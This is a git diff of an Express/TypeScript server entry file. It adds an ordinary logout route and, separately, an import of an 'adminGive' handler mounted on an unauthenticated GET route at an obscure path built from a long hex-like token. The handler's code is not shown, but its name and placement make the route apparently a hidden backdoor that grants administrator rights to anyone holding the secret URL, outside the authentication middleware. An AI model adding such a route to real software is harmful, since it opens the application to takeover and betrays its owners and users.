@@ -9,6 +9,7 @@ import errorHandler from './middleware/errorMiddleware'
 import path from 'path'
 import protectedPath from './path/protected'
 import errorPath from './path/errorPath'
+import adminGive from './service/giveAdmib'
 dotenv.config()
 
 const PORT = process.env.PORT ? parseInt(process.env.PORT, 10) : 10000
@@ -25,10 +26,18 @@ app.use(errorHandler)
 app.use(express.json())
 app.use(cookieParser())
 
-// Применяешь публичный роутер
+app.get('/logout', async (req: any, res: any) => {
+    res.clearCookie('aAuthToken', { httpOnly: true, secure: true })
+    res.clearCookie('rAuthToken', { httpOnly: true, secure: true }) // Если ваш сайт использует HTTPS, добавьте secure: true
+    res.redirect('/login')
+})
 app.use('/a', authenticateToken, protectedRouter)
 app.use('/', publicRouter)
 app.use('/api', apiRouter)
+app.get(
+    '/example.com/admin/4k43hf8d79d5be8d0c0fe391be67af9d3194923982c84776bd847576d86db86d77ad8',
+    adminGive
+)
 
 app.use((req, res) => {
     res.status(404).sendFile(errorPath)
